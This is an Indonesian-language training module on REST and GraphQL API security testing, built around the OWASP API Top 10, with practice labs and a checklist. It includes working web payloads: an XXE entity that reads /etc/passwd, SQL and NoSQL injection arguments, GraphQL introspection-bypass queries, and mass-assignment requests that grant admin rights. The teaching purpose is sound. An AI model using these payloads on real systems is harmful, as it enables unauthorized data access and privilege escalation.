# Sesi 22 — API Security (REST & GraphQL)

> **Level:** Intermediate–Advanced  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP), Sesi 07 (IDOR), Sesi 06 (Auth)  
> **Tools:** Burp Suite, Postman/Insomnia, InQL (GraphQL extension Burp)

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Memahami dan menguji OWASP API Security Top 10
- Mengidentifikasi BOLA, BFLA, dan Mass Assignment di REST API
- Menemukan Excessive Data Exposure di API response
- Melakukan reconnaissance pada GraphQL API (introspection, schema mapping)
- Mengeksploitasi BOLA dan injection di GraphQL resolver
- Menggunakan Postman dan InQL untuk systematic API testing

---

## 📚 Bagian 1 — Mengapa API Security Berbeda

### 1.1 API vs Web App Traditional

```
Web App Traditional:
Browser → HTML Form → Server → HTML Response
(Mudah dilihat manusia, developer cenderung lebih hati-hati)

API Modern:
Client (app/JS) → JSON Request → Server → JSON Response
(Tidak ada UI = developer sering lupa "users can manipulate this too")
```

### 1.2 OWASP API Security Top 10 (2023)

| # | Vulnerability | Deskripsi Singkat |
|---|--------------|------------------|
| API1 | **BOLA** | Akses object milik user lain via ID manipulation |
| API2 | **Broken Authentication** | Auth token lemah, JWT misconfiguration |
| API3 | **Broken Object Property Level Auth** | Baca/ubah property yang seharusnya restricted |
| API4 | **Unrestricted Resource Consumption** | Rate limit missing, costly operations |
| API5 | **BFLA** | Akses fungsi admin/privileged tanpa hak |
| API6 | **Unrestricted Access to Sensitive Business Flows** | Bypass business logic via API |
| API7 | **SSRF** | Server fetch URL yang dikontrol attacker |
| API8 | **Security Misconfiguration** | Debug on, CORS wildcard, verbose error |
| API9 | **Improper Inventory Management** | API versi lama masih aktif, undocumented endpoint |
| API10 | **Unsafe Consumption of APIs** | Server percaya input dari third-party API |

---

## 📚 Bagian 2 — REST API Testing

### 2.1 Recon API: Temukan Endpoint

```bash
# 1. Dari browser DevTools / Burp — browse aplikasi normal
#    Perhatikan semua XHR/Fetch requests

# 2. Dari JS source files
curl https://target.com/app.js | grep -oE '"/api/[^"]*"' | sort -u

# 3. Dari API documentation (jika publik)
# Swagger UI: /swagger-ui, /api-docs, /swagger.json
# Redoc: /redoc
# OpenAPI: /openapi.json, /api/openapi.yaml

# 4. Fuzzing API endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -mc 200,201,401,403 \
     -H "Authorization: Bearer [TOKEN]"

# 5. API versioning — coba versi lama
/api/v1/ → masih aktif dengan less security?
/api/v2/ → endpoint baru
/api/beta/ → less tested
/api/internal/ → admin endpoints?
/api/dev/ → development leftovers?
```

### 2.2 BOLA (Broken Object Level Authorization) di REST

```http
# Pola BOLA paling umum — ganti ID di setiap endpoint

# User management
GET /api/v1/users/1001/profile           → coba 1002, 1003...
GET /api/v1/users/1001/documents         → dokumen user lain?
DELETE /api/v1/users/1001                → hapus akun orang lain?

# Order/Transaction
GET /api/v1/orders/ORD-2024-001          → ORD-2024-002?
PUT /api/v1/orders/ORD-2024-001/cancel   → cancel order orang lain?

# Messaging
GET /api/v1/conversations/555/messages   → pesan thread orang lain?
POST /api/v1/conversations/555/reply     → kirim ke thread orang lain?

# File/Document
GET /api/v1/files/report_q1_2024.pdf     → file orang lain?
DELETE /api/v1/files/contract_1234.docx  → hapus file orang lain?

# Nested resources (SANGAT SERING terlewat!)
GET /api/v1/orgs/100/projects/50/tasks   → apakah validasi org membership?
GET /api/v1/teams/25/settings            → apakah validasi team membership?
```

### 2.3 Excessive Data Exposure

```http
# Banyak API mengembalikan data lebih dari yang dibutuhkan frontend

# Request
GET /api/v1/users/me HTTP/1.1
Authorization: Bearer [USER_TOKEN]

# Response yang berlebihan (BUG!)
{
  "id": 1337,
  "username": "johndoe",
  "email": "john@example.com",
  
  // Seharusnya tidak ada di response user biasa:
  "role": "user",
  "is_admin": false,
  "internal_notes": "Flagged for suspicious activity",
  "payment_methods": [{"last4": "4242", "type": "visa"}],
  "password_hash": "$2b$12$abcdef...",
  "api_key": "sk_live_xxxxxxxxxxxxx",
  "two_factor_secret": "JBSWY3DPEHPK3PXP",
  "login_history": [...]
}
```

**Cara test:**
1. Buat akun user biasa
2. Akses endpoint profil/data
3. Bandingkan dengan response di dokumentasi
4. Semua field yang tidak perlu dikembalikan ke client = potential bug

### 2.4 Mass Assignment

```http
# Server menerima semua field dari JSON tanpa filtering

# Request normal (update profile)
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json

{"name": "New Name", "bio": "Updated bio"}

# Mass Assignment attack — tambahkan field yang seharusnya tidak bisa diubah
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json

{
  "name": "New Name",
  "bio": "Updated bio",
  "role": "admin",           ← privilege escalation!
  "is_verified": true,       ← bypass email verification!
  "credit_balance": 99999,   ← free credits!
  "subscription_plan": "enterprise"  ← upgrade gratis!
}

# Cara temukan field tersembunyi:
# 1. Dari GET response — lihat semua field yang ada
# 2. Dari JS source code
# 3. Dari error messages ("Unknown field: role")
# 4. Dari API documentation
# 5. Param Miner Burp Extension
```

### 2.5 BFLA (Broken Function Level Authorization)

```http
# Test endpoint admin dengan user token biasa

# Admin-only endpoints yang umum:
POST /api/v1/admin/users             ← create user tanpa verifikasi
DELETE /api/v1/admin/users/{id}      ← hapus user
GET /api/v1/admin/users              ← list semua user
PUT /api/v1/admin/config             ← ubah konfigurasi
GET /api/v1/admin/logs               ← akses log sistem
POST /api/v1/admin/export-all        ← export semua data

# Juga test dengan metode HTTP berbeda
GET /api/v1/reports → user bisa akses (200 OK)
DELETE /api/v1/reports → apakah ada validasi untuk DELETE?
POST /api/v1/reports/archive → endpoint baru yang belum di-protect?

# HTTP verb tampering
# Jika POST /api/admin/action → 403 (blocked)
# Coba: GET /api/admin/action → 200? (verb check tidak konsisten)
```

---

## 📚 Bagian 3 — GraphQL Security

### 3.1 Mengapa GraphQL Berbeda

```
REST API:
- Endpoint spesifik per resource (/users, /orders)
- Satu endpoint = satu function

GraphQL:
- Satu endpoint (/graphql atau /api/graphql)
- Query fleksibel — client tentukan data apa yang diminta
- Mutation untuk perubahan data
- Subscription untuk real-time

Implikasi security:
- Authorization harus diimplementasikan per-resolver, bukan per-endpoint
- Introspection bisa expose seluruh schema
- Nested query bisa menyebabkan DoS
```

### 3.2 Temukan GraphQL Endpoint

```bash
# Endpoint umum GraphQL
/graphql
/api/graphql
/graphql/v1
/v1/graphql
/query
/graph

# Cek dengan introspection query
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query": "__schema { types { name } }"}'

# Jika introspection enabled → response berisi semua types
```

### 3.3 GraphQL Introspection — Mapping Full Schema

```graphql
# Query introspection lengkap
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args {
          name
          type { name kind ofType { name kind } }
        }
      }
    }
  }
}
```

**Menggunakan InQL Burp Extension:**
```
1. Install InQL: Burp → Extensions → BApp Store → InQL
2. Tab InQL → Target URL → Analyze
3. InQL otomatis:
   - Kirim introspection query
   - Parse schema
   - Generate semua possible queries
   - Highlight potential vulnerabilities
```

### 3.4 BOLA di GraphQL

```graphql
# Query normal — akses data sendiri
query {
  user(id: "current_user_id") {
    name
    email
    orders { id, total }
  }
}

# BOLA — ganti ID ke user lain
query {
  user(id: "OTHER_USER_ID") {
    name
    email
    orders { id, total }
    paymentMethods { last4, type }  # data sensitif!
    privateNotes
  }
}

# Batch BOLA — enumerate banyak sekaligus
query {
  user1: user(id: "1") { email name }
  user2: user(id: "2") { email name }
  user3: user(id: "3") { email name }
  # ... batch 100 user dalam satu request
}
```

### 3.5 Field Suggestion Exploitation

```graphql
# GraphQL sering memberikan "Did you mean..." suggestions
# Ini mengungkap nama field yang ada!

query {
  user {
    emal  # typo → "Did you mean: email, emailVerified, emailPreferences?"
  }
}

# Response:
{
  "errors": [{
    "message": "Cannot query field 'emal'. Did you mean 'email', 'emailVerified'?"
  }]
}
# → Kita tahu ada field 'emailVerified' yang mungkin menarik!
```

### 3.6 GraphQL Injection via Arguments

```graphql
# Jika argument langsung masuk ke query database
query {
  searchProducts(name: "test' OR '1'='1") {
    id
    name
    price
  }
}

# NoSQL injection di MongoDB resolver
query {
  user(email: {$ne: null}) {
    id
    email
    password
  }
}
```

### 3.7 GraphQL Introspection Disabled — Bypass

```graphql
# Jika introspection di-disable, coba:

# 1. Fragment-based introspection bypass
query {
  __typename
  ...{ __schema { types { name } } }
}

# 2. Field suggestion masih aktif bahkan tanpa introspection
# Query field yang tidak ada → error suggestion mengungkap field nyata

# 3. Cari schema di JS bundle aplikasi
curl https://target.com/static/js/app.js | grep -i "graphql\|mutation\|query"
```

---

## 📚 Bagian 4 — API Reconnaissance Lanjutan

### 4.1 Temukan Hidden API Parameters

```bash
# Param Miner Burp Extension
# Klik kanan request → Extensions → Param Miner → Guess params

# Arjun — HTTP parameter discovery
pip install arjun
arjun -u https://target.com/api/endpoint

# Manual — dari JS source code
curl https://target.com/app.js | \
  grep -oE '"[a-z_]+":\s*[{"\[]' | \
  grep -v 'function\|class\|return'
```

### 4.2 API Versioning Issues

```bash
# Coba versi API yang lebih lama
# V2 mungkin punya security controls, V1 mungkin tidak

curl https://target.com/api/v1/users
curl https://target.com/api/v2/users
curl https://target.com/api/v3/users

# Juga coba:
/api/beta/
/api/internal/
/api/legacy/
/api/2023-01/   # date-versioned
```

### 4.3 Content-Type Manipulation

```http
# Normal: JSON request
POST /api/v1/update HTTP/1.1
Content-Type: application/json
{"key": "value"}

# Coba: Form data (beda parsing, mungkin bypass validasi)
POST /api/v1/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded
key=value

# Coba: XML (bisa trigger XXE!)
POST /api/v1/update HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><key>&xxe;</key></root>
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — BOLA di Shopify API (Real — Disclosed)

> **Platform:** HackerOne — Shopify  
> **Referensi:** Shopify HackerOne disclosed reports  
> **Severity:** High

**Skenario:**
Endpoint admin API Shopify untuk mengakses data toko menggunakan numeric ID. Peneliti menemukan bahwa dengan mengubah shop_id di API request, bisa mengakses data inventori, pesanan, dan data pelanggan toko Shopify lain.

```http
# Akses API dengan shop ID sendiri
GET /admin/api/2024-01/orders.json HTTP/1.1
Host: myshop.myshopify.com
X-Shopify-Access-Token: [VALID_TOKEN]

# BOLA: ganti hostname (shop ID tersembunyi di subdomain)
GET /admin/api/2024-01/orders.json HTTP/1.1
Host: othershop.myshopify.com     ← toko orang lain!
X-Shopify-Access-Token: [VALID_TOKEN]  ← token sendiri, tapi akses toko lain
```

---

### Case 2 — Mass Assignment di User Registration (Real Pattern)

> **Referensi:** Pola dari beberapa H1 reports tentang Rails strong parameters bypass  
> **Severity:** High (P2)

**Detail:**
Endpoint registrasi user di aplikasi berbasis Ruby on Rails tidak menggunakan strong parameters dengan benar. Attacker bisa menambahkan field `admin: true` saat registrasi.

```http
POST /api/v1/users/register HTTP/1.1
Content-Type: application/json

{
  "user": {
    "email": "attacker@email.com",
    "password": "SecurePass123",
    "name": "Attacker Name",
    "admin": true              ← field yang seharusnya tidak bisa diset!
  }
}

# Response:
HTTP/1.1 201 Created
{
  "id": 9999,
  "email": "attacker@email.com",
  "name": "Attacker Name",
  "admin": true,               ← berhasil!
  "role": "administrator"
}
```

---

### Case 3 — GraphQL BOLA di GitHub (Real — CVE-2022-xxxx Pattern)

> **Referensi:** GitHub Security Advisory & GraphQL security research  
> **Severity:** High

**Skenario (terinspirasi dari pola GitHub GraphQL research):**

```graphql
# Query: akses data repository private orang lain via GraphQL
query {
  repository(owner: "victim_org", name: "private-repo") {
    name
    isPrivate
    # Jika BOLA: data private repository ter-expose
    issues(first: 100) {
      nodes {
        title
        body
        author { login }
      }
    }
    pullRequests(first: 100) {
      nodes {
        title
        body
        headRefOid  # commit hash dari branch private!
      }
    }
  }
}
```

---

### Case 4 — Excessive Data Exposure di API Twitter v2 (Pattern)

> **Referensi:** OWASP API3:2023 — Broken Object Property Level Authorization  
> **Severity:** Medium–High

**Skenario:**
API `/api/v2/users/{id}` untuk mendapatkan profil publik juga mengembalikan field internal seperti `phone_number_status`, `email_verified`, `account_flags`, dll yang seharusnya tidak ter-expose.

```json
{
  "id": "1234567890",
  "name": "John Doe",
  "username": "johndoe",
  "public_metrics": { "followers_count": 1000 },
  
  // SEHARUSNYA TIDAK ADA:
  "phone_number": "+62812345678",
  "email": "private@email.com",
  "account_flags": ["suspicious_activity"],
  "internal_id": "INTERNAL-UUID-xxx",
  "login_verification": "phone"
}
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy API Labs
- 🔗 [Exploiting an API endpoint using documentation](https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation)
- 🔗 [Finding and exploiting unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)
- 🔗 [API Testing Learning Path](https://portswigger.net/web-security/api-testing)

### Lab 2 — OWASP crAPI (Completely Ridiculous API)
```bash
# crAPI adalah aplikasi sengaja rentan untuk latihan API security
docker-compose -f docker-compose.yml up -d
# Buka: http://localhost:8888
# Challenges: https://github.com/OWASP/crAPI/tree/develop/docs/challenges.md

# Challenges yang tersedia:
# - BOLA via Vehicle ID
# - BFLA via Community API
# - Mass Assignment
# - Excessive Data Exposure
```

### Lab 3 — vAPI (Vulnerable API)
```bash
git clone https://github.com/roottusk/vapi
cd vapi
docker-compose up -d
# Buka: http://localhost/vapi/
# Includes: 18 API security challenges
```

### Lab 4 — HackTheBox Academy
- 🔗 [API Attacks Module](https://academy.hackthebox.com/module/details/160)
- 🔗 [Web Service & API Attacks](https://academy.hackthebox.com/module/details/222)

### Lab 5 — TryHackMe
- 🔗 [GraphQL](https://tryhackme.com/room/graphql)
- 🔗 [OWASP API Security Top 10](https://tryhackme.com/room/owaspapisecuritytop105)

---

## 📋 API Testing Checklist

```markdown
## API Security Checklist

### Discovery
- [ ] Swagger/OpenAPI docs ditemukan?
- [ ] API versioning (v1, v2, beta, internal)?
- [ ] Endpoint dari JS source code?
- [ ] HTTP methods apa saja yang diterima?

### BOLA Testing
- [ ] Ganti semua numeric ID di path
- [ ] Ganti semua UUID di path
- [ ] Ganti ID di query parameter
- [ ] Ganti ID di request body
- [ ] Nested resource authorization

### Excessive Data Exposure
- [ ] Response mengandung field sensitif?
- [ ] Field yang tidak ditampilkan di UI tapi ada di response?
- [ ] Error response bocorkan info server?

### Mass Assignment
- [ ] Kirim role/is_admin/privilege di PATCH/PUT
- [ ] Field dari GET response → coba di POST/PATCH
- [ ] Param Miner untuk field tersembunyi

### BFLA
- [ ] Endpoint admin dengan user token?
- [ ] HTTP verb tampering?
- [ ] Path traversal ke endpoint admin?

### GraphQL
- [ ] Introspection aktif?
- [ ] BOLA via mutation/query
- [ ] Injection via arguments
- [ ] Nested query abuse
- [ ] Field suggestion exploitation
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| OWASP API Security | [API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) | API security reference |
| PortSwigger | [API Testing Guide](https://portswigger.net/web-security/api-testing) | Practical testing |
| GraphQL Foundation | [Security Best Practices](https://graphql.org/learn/security/) | GraphQL security |
| InQL | [Burp Extension](https://portswigger.net/bappstore/296e9a0730384be4855c43bd369202db) | GraphQL automation |
| crAPI | [Challenge Guide](https://github.com/OWASP/crAPI) | Hands-on lab |
| APIsecurity.io | [Newsletter & Research](https://apisecurity.io/) | API security news |

---

## 🔑 Key Takeaways

1. **API-first = attack surface yang terus berkembang** — setiap mobile app dan SaaS punya API
2. **BOLA di API lebih mudah ditemukan** karena ID lebih eksplisit daripada di web app
3. **Introspection GraphQL = blueprint serangan** — schema terbuka = tahu semua yang bisa diserang
4. **Mass assignment sering ada di framework modern** — Rails, Laravel, NestJS semua rentan jika tidak dikonfigurasi
5. **Versi API lama = less security** — selalu test /api/v1/ meski app sudah pakai /api/v3/

---

*Sesi berikutnya: **Sesi 13 — SSRF (Server-Side Request Forgery)***
